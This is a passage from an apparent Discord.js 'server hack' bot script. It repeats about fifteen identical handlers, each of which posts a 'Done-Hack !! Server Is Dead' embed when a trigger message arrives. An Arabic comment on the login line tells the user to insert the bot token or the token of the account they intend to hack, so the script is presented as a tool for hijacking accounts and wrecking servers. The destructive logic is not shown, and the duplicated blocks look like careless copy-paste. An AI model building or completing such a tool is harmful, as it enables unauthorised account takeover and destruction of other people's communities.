   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});










client.login('') //هنا توكن البوت او الحساب اللي بتهكره

client.login(process.env.BOT_TOKEN);
